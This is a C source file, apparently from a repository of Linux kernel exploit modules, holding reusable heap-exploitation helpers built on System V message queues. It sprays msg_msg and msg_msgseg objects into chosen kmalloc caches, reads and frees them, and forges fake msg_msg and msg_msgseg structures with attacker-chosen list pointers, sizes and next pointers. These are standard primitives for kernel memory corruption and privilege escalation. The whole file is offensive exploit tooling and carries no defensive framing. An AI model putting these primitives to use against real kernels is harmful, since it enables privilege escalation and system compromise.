// https://github.com/qwerty-po/kernel_exploit_modules/keyring.c

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>

#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#include "msg_msg.h"

#define DEBUG 0

int alloc_msg_queue(void)
{
    int msqid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
    if (msqid == -1)
        perror("msgget");
    return msqid;
}

void insert_msg_msg(int msqid, int64_t mtype, uint64_t objectsz, uint64_t msgsz, char *mtext)
{
    assert(msgsz <= objectsz);
    struct msg *msg = (struct msg *)calloc(MSG_HEADER_SIZE + objectsz, 1);
    
    msg->m_type = mtype;
    // in kernel, data will fill at [0x30, msgsz-MSG_MSG_HEADER_SIZE)
    memset(msg->m_text, '\xbf', objectsz);
    memcpy(msg->m_text, mtext, msgsz); 
    
    if (msgsnd(msqid, msg, objectsz, 0) < 0)
        perror("msgsnd");
}

char *read_msg_msg(int msqid, int64_t mtype, uint64_t msgsz)
{
    struct msg *buf = (struct msg *)calloc(MSG_HEADER_SIZE + msgsz, 1);
    uint64_t len = 0;
    if ((len = msgrcv(msqid, buf, msgsz, mtype, 0)) < 0)
        perror("msgrcv");
    char *target = (char *)calloc(len, 1);
    memcpy(target, buf->m_text, len);
    return target;
}

void release_msg_msg(int msqid, int64_t mtype)
{
    read_msg_msg(msqid, mtype, MSG_MSG_KMALLOC_CG_4k);
}

void insert_msg_msgseg(int msqid, int64_t mtype, uint64_t objectsz, uint64_t msgsz, char *mtext)
{
    assert(msgsz <= objectsz);
    struct msg *msg = (struct msg *)calloc(MSG_HEADER_SIZE + MSG_MSG_KMALLOC_CG_4k + objectsz, 1);
    
    msg->m_type = mtype;
    // in kernel, data will fill at [0x30, 4k) -> kmalloc-4k
    //                              [0x8, msgsz) -> target slab
    memset(msg->m_text, '\xbf', MSG_MSG_KMALLOC_CG_4k + objectsz);
    memcpy(msg->m_text + MSG_MSG_KMALLOC_CG_4k, mtext, msgsz);
    
    #if DEBUG
    printf("insert_msg_msgseg: msgsz: 0x%lx\n", MSG_MSG_KMALLOC_CG_4k + objectsz);
    #endif


    if (msgsnd(msqid, msg, MSG_MSG_KMALLOC_CG_4k + objectsz, IPC_NOWAIT) < 0)
        perror("msgsnd");
}

char *read_msg_msgseg(int msqid, int64_t mtype, uint64_t objectsz)
{
    struct msg *msg = (struct msg *)calloc(MSG_HEADER_SIZE + MSG_MSG_KMALLOC_CG_4k + objectsz, 1);
    if (msgrcv(msqid, msg, MSG_MSG_KMALLOC_CG_4k + objectsz, mtype, IPC_NOWAIT) < 0)
        perror("msgrcv");
    
    char *target = (char *)calloc(objectsz, 1);
    memcpy(target, msg->m_text + MSG_MSG_KMALLOC_CG_4k, objectsz);
    return target;
}

void release_msg_msgseg(int msqid, int64_t mtype)
{
    read_msg_msgseg(msqid, mtype, MSG_MSG_KMALLOC_CG_4k + MSG_MSGSEG_KMALLOC_CG_4k);
}

struct msg_msg *fake_msg_msg(struct list_head *list_next, struct list_head *list_prev, int64_t mtype, int m_ts, void *next, char *mtext, uint64_t datalen)
{
    struct msg_msg *msg = (struct msg_msg *)calloc(MSG_MSG_HEADER_SIZE + datalen, 1);
    msg->m_list.next = list_next;
    msg->m_list.prev = list_prev;
    msg->m_type = mtype;
    msg->m_ts = m_ts;
    msg->next = next;
    memcpy(msg->m_text, mtext, datalen);

    return msg;
}

struct msg_msgseg *fake_msg_msgseg(struct msg_msgseg *next, char *mtext, uint64_t datalen)
{
    struct msg_msgseg *msgseg = (struct msg_msgseg *)calloc(MSG_MSGSEG_HEADER_SIZE + datalen, 1);
    msgseg->next = next;
    memcpy(msgseg->m_text, mtext, datalen);
    
    return msgseg;
}